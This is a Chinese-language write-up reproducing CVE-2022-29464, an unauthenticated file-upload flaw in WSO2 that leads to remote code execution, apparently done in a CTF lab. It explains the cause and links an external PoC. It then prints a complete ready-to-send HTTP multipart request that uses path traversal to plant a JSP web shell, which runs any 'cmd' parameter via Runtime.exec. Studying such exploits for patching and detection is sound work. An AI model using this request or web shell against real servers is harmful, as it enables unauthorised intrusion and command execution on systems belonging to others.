## 1. 漏洞介绍
WSO2文件上传漏洞（CVE-2022-29464）是Orange Tsai发现的WSO2上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。
## 2. 漏洞原理
 WSO2的配置文件 WSO2AM_Home\repository\conf\identity\identity.xml中，修饰 /fileupload(.\*) 接口的 secured 属性为 false，这就意味着路由资源访问可以不需要身份验证，从而可以通过构造恶意的post请求包达到恶意jsp文件上传的目的。
## 3. 漏洞 POC
- [Poc/FileUpload/CVE-2022-29464.py at main · wave-to/Poc](https://github.com/wave-to/Poc/blob/main/FileUpload/CVE-2022-29464.py)
## 4. 漏洞复现
### 4.1. POC 上传 wavesky.jsp
启动环境后，直接用 GitHub 下载的 Poc 上传 wavesky.jsp ，之后根据提示访问对应 URL 即可。
![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281659633.png)

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281659900.png)
**RCE**
![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281700233.png)
### 4.2. 借助 burp suite 上传
burp 抓包构造 post 请求包实现 jsp 上传
```http
POST /fileupload/toolsAny HTTP/2
Host: eci-2zeer2drycfpgmtcc1x8.cloudeci1.ichunqiu.com:9443
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Length: 904
Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
User-Agent: python-requests/2.22.0


--4ef9f369a86bfaadf5ec3177278d49c0
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/wavesky.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/wavesky.jsp"

<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
       String s = null;
       try {
           Process p = Runtime.getRuntime().exec(cmd,null,null);
          BufferedReader sI = new BufferedReader(new
 InputStreamReader(p.getInputStream()));
           while((s = sI.readLine()) != null) { output += s+"</br>"; }
         }  catch(IOException e) {   e.printStackTrace();   }
    }
 %>
         <pre><%=output %></pre>
--4ef9f369a86bfaadf5ec3177278d49c0--
```
 注意，要将 Host 和 Accept 字段的值换成自己环境抓到的。
![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281700236.png)

- 访问 https://xxxxx/authenticationendpoint/wavesky.jsp  flag 获取同前。
